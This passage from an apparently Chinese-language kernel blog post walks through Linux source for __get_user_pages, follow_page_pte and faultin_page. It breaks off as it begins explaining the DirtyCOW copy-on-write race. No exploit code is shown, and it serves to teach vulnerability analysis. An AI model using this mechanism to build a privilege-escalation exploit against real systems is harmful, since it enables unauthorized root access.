</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="o">-</span><span class="nl">EFAULT</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="o">-</span><span class="nl">ENOMEM</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="o">-</span><span class="nl">EHWPOISON</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="n">i</span> <span class="o">?</span> <span class="nl">i</span> <span class="p">:</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="o">-</span><span class="nl">EBUSY</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="o">-</span><span class="nl">ENOENT</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">				<span class="k">goto</span> <span class="n">next_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="nf">BUG</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">PTR_ERR</span><span class="p">(</span><span class="n">page</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="n">EEXIST</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * Proper page table entry exists, but no corresponding
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * struct page.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 */</span>
</span></span><span class="line"><span class="cl">			<span class="k">goto</span> <span class="n">next_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">IS_ERR</span><span class="p">(</span><span class="n">page</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">i</span> <span class="o">?</span> <span class="nl">i</span> <span class="p">:</span> <span class="nf">PTR_ERR</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">pages</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">pages</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="nf">flush_anon_page</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">flush_dcache_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="n">page_mask</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">next_page</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">vmas</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">vmas</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">vma</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="n">page_mask</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">page_increm</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="n">start</span> <span class="o">&gt;&gt;</span> <span class="n">PAGE_SHIFT</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">page_mask</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">page_increm</span> <span class="o">&gt;</span> <span class="n">nr_pages</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="n">page_increm</span> <span class="o">=</span> <span class="n">nr_pages</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">i</span> <span class="o">+=</span> <span class="n">page_increm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">start</span> <span class="o">+=</span> <span class="n">page_increm</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">nr_pages</span> <span class="o">-=</span> <span class="n">page_increm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">nr_pages</span><span class="p">);</span>		<span class="c1">// 直到所有的页都处理完毕
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">EXPORT_SYMBOL</span><span class="p">(</span><span class="n">__get_user_pages</span><span class="p">);</span>
</span></span></code></pre></div><h5 id="follow_page_mask">follow_page_mask</h5>
<p><code>follow_page_mask</code>会一步步解析地址得到所在的 pte，然后调用<code>follow_page_pte</code>尝试获取 page struct，逻辑比较简单，就是一顿检查通过后返回 page struct，并且可见找不到地址映射以及无写权限都会返回 NULL</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="nf">follow_page_pte</span><span class="p">(</span><span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">pmd_t</span> <span class="o">*</span><span class="n">pmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span> <span class="o">=</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_mm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">spinlock_t</span> <span class="o">*</span><span class="n">ptl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">pte_t</span> <span class="o">*</span><span class="n">ptep</span><span class="p">,</span> <span class="n">pte</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">retry</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="nf">pmd_bad</span><span class="p">(</span><span class="o">*</span><span class="n">pmd</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nf">no_page_table</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ptep</span> <span class="o">=</span> <span class="nf">pte_offset_map_lock</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">pte</span> <span class="o">=</span> <span class="o">*</span><span class="n">ptep</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">pte_present</span><span class="p">(</span><span class="n">pte</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kt">swp_entry_t</span> <span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * KSM&#39;s break_ksm() relies upon recognizing a ksm page
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * even while it is being migrated, so for that case we
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * need migration_entry_wait().
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nf">likely</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_MIGRATION</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">			<span class="k">goto</span> <span class="n">no_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nf">pte_none</span><span class="p">(</span><span class="n">pte</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">goto</span> <span class="n">no_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">entry</span> <span class="o">=</span> <span class="nf">pte_to_swp_entry</span><span class="p">(</span><span class="n">pte</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">is_migration_entry</span><span class="p">(</span><span class="n">entry</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">goto</span> <span class="n">no_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">ptep</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">migration_entry_wait</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">retry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_NUMA</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nf">pte_protnone</span><span class="p">(</span><span class="n">pte</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">no_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_WRITE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">pte_write</span><span class="p">(</span><span class="n">pte</span><span class="p">))</span> <span class="p">{</span>	<span class="c1">// 欲执行写操作，但是没有写权限
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">ptep</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">page</span> <span class="o">=</span> <span class="nf">vm_normal_page</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pte</span><span class="p">);</span>	<span class="c1">// 获取page struct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_DUMP</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="cm">/* Avoid special (like zero) pages in core dumps */</span>
</span></span><span class="line"><span class="cl">			<span class="n">page</span> <span class="o">=</span> <span class="nf">ERR_PTR</span><span class="p">(</span><span class="o">-</span><span class="n">EFAULT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nf">is_zero_pfn</span><span class="p">(</span><span class="nf">pte_pfn</span><span class="p">(</span><span class="n">pte</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">page</span> <span class="o">=</span> <span class="nf">pte_page</span><span class="p">(</span><span class="n">pte</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="n">ret</span> <span class="o">=</span> <span class="nf">follow_pfn_pte</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">ptep</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="n">page</span> <span class="o">=</span> <span class="nf">ERR_PTR</span><span class="p">(</span><span class="n">ret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_GET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nf">get_page_foll</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_TOUCH</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">((</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_WRITE</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">		    <span class="o">!</span><span class="nf">pte_dirty</span><span class="p">(</span><span class="n">pte</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">PageDirty</span><span class="p">(</span><span class="n">page</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="nf">set_page_dirty</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * pte_mkyoung() would be more correct here, but atomic care
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * is needed to avoid losing the dirty bit: it is easier to use
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * mark_page_accessed().
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="nf">mark_page_accessed</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_MLOCK</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_flags</span> <span class="o">&amp;</span> <span class="n">VM_LOCKED</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * The preliminary mapping check is mainly to avoid the
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * pointless overhead of lock_page on the ZERO_PAGE
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * which might bounce very badly if there is contention.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * If the page is already locked, we don&#39;t need to
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * handle it now - vmscan will handle it later if and
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * when it attempts to reclaim the page.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">page</span><span class="o">-&gt;</span><span class="n">mapping</span> <span class="o">&amp;&amp;</span> <span class="nf">trylock_page</span><span class="p">(</span><span class="n">page</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">lru_add_drain</span><span class="p">();</span>  <span class="cm">/* push cached pages to LRU */</span>
</span></span><span class="line"><span class="cl">			<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * Because we lock page here, and migration is
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * blocked by the pte&#39;s page reference, and we
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * know the page is still mapped, we don&#39;t even
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * need to check for file-cache page truncation.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 */</span>
</span></span><span class="line"><span class="cl">			<span class="nf">mlock_vma_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">unlock_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">ptep</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">no_page</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">ptep</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">pte_none</span><span class="p">(</span><span class="n">pte</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">no_page_table</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h5 id="faultin_page">faultin_page</h5>
<p><code>faultin_page</code>类似，设置好标志之后调用<code>handle_mm_fault</code>正式进入缺页异常处理流程，这个会在后面展开</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">faultin_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">tsk</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">flags</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">nonblocking</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span> <span class="o">=</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_mm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fault_flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* mlock all present pages, but do not fault in new pages */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">FOLL_POPULATE</span> <span class="o">|</span> <span class="n">FOLL_MLOCK</span><span class="p">))</span> <span class="o">==</span> <span class="n">FOLL_MLOCK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* For mm_populate(), just skip the stack guard page. */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_POPULATE</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">			<span class="p">(</span><span class="nf">stack_guard_page_start</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">			 <span class="nf">stack_guard_page_end</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_WRITE</span><span class="p">)</span>	<span class="c1">// 欲执行写操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">fault_flags</span> <span class="o">|=</span> <span class="n">FAULT_FLAG_WRITE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">nonblocking</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">fault_flags</span> <span class="o">|=</span> <span class="n">FAULT_FLAG_ALLOW_RETRY</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_NOWAIT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">fault_flags</span> <span class="o">|=</span> <span class="n">FAULT_FLAG_ALLOW_RETRY</span> <span class="o">|</span> <span class="n">FAULT_FLAG_RETRY_NOWAIT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_TRIED</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">VM_WARN_ON_ONCE</span><span class="p">(</span><span class="n">fault_flags</span> <span class="o">&amp;</span> <span class="n">FAULT_FLAG_ALLOW_RETRY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">fault_flags</span> <span class="o">|=</span> <span class="n">FAULT_FLAG_TRIED</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">handle_mm_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">fault_flags</span><span class="p">);</span>	<span class="c1">// 处理缺页异常
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_ERROR</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_OOM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">VM_FAULT_HWPOISON</span> <span class="o">|</span> <span class="n">VM_FAULT_HWPOISON_LARGE</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_HWPOISON</span> <span class="o">?</span> <span class="o">-</span><span class="nl">EHWPOISON</span> <span class="p">:</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">VM_FAULT_SIGBUS</span> <span class="o">|</span> <span class="n">VM_FAULT_SIGSEGV</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nf">BUG</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">tsk</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_MAJOR</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="n">tsk</span><span class="o">-&gt;</span><span class="n">maj_flt</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span>
</span></span><span class="line"><span class="cl">			<span class="n">tsk</span><span class="o">-&gt;</span><span class="n">min_flt</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_RETRY</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">nonblocking</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="o">*</span><span class="n">nonblocking</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * can thus safely do subsequent page lookups as if they were reads.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * But only do so when looping for pte_write is futile: in some cases
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * userspace may also be wanting to write to the gotten user page,
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * which a read fault here might prevent (a readonly page might get
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * reCOWed by userspace write).
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_WRITE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_flags</span> <span class="o">&amp;</span> <span class="n">VM_WRITE</span><span class="p">))</span>	<span class="c1">// 若vma不可写，但是缺页异常处理成功，且需要写操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="o">*</span><span class="n">flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">FOLL_WRITE</span><span class="p">;</span>	<span class="c1">// 清除写操作标志，否则会在__get_user_pages中返回不断retry
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h4 id="dirtycow">DirtyCOW</h4>
<h5 id="handling-page-fault">Handling Page Fault</h5>
<p><code>__get_user_pages</code>中<code>retry</code>标签中表示的重试机制其实就是访存时缺页异常的大致处理流程，以本文场景为例，注意这里的操作不是原子的</p>
<ol>
<li>第一次
<ol>
<li>Task 第一次访问<code>mmap</code>将文件映射进的地址，由于<code>mmap</code>不会将页面读进内存，<code>follow_page_mask</code>获取页面失败造成第一次缺页异常</li>
